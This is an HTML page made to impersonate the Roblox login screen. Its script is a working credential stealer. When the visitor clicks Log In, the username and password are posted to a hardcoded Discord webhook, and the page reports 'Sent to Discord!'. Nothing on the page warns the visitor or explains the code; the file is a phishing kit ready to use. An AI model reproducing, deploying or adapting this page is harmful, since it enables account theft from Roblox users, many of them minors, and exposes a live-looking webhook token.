<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #1C1C1C;
            font-family: 'Roboto', sans-serif;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: #2C2C2C;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            width: 300px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        .login-box h2 {
            font-weight: 700;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 5px;
            background-color: black;
            color: white;
            font-size: 16px;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: black;
            color: white;
            font-size: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 5px;
            font-weight: 700;
            cursor: pointer;
            transition: border-color 0.3s;
        }
        .login-box button:hover {
            border-color: rgba(255, 255, 255, 0.8);
        }
        .login-box a {
            color: rgba(255, 255, 255, 0.6);
            text-decoration: none;
        }
        .login-box a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Login to Roblox</h2>
        <input type="text" id="login-username" placeholder="Username/Email/Phone">
        <input type="password" id="login-password" placeholder="Password">
        <button id="login-button">Log In</button>
        <a href="#">Forgot Password or Username?</a>
        <p>Don't have an account? <a href="#">Sign Up</a></p>
    </div>

    <script>
    window.onload = function () {
        const loginButton = document.getElementById("login-button");
        const usernameField = document.getElementById("login-username");
        const passwordField = document.getElementById("login-password");

        loginButton.addEventListener("click", function () {
            const username = usernameField.value.trim();
            const password = passwordField.value.trim();

            if (!username || !password) {
                alert("Please enter username and password.");
                return;
            }

            const webhookURL = "https://discord.com/api/webhooks/1354960262477778964/FE--ABHUDffQwH_-EJR372S-28DabfGF8coqfi-q4RxRDwmc-fGOO4qTyRlNefZYdAz8"; // üîÅ Replace this

            const payload = {
                username: "Roblox Login Logger (Test)",
                content: `üë§ **Username:** \`${username}\`\nüîê **Password:** \`${password}\`\nüïí ${new Date().toLocaleString()}`
            };

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
            .then(() => {
                alert("‚úÖ Sent to Discord!");
            })
            .catch((error) => {
                alert("‚ùå Failed to send!");
                console.error("Webhook Error:", error);
            });
        });
    };
    </script>
</body>
</html>
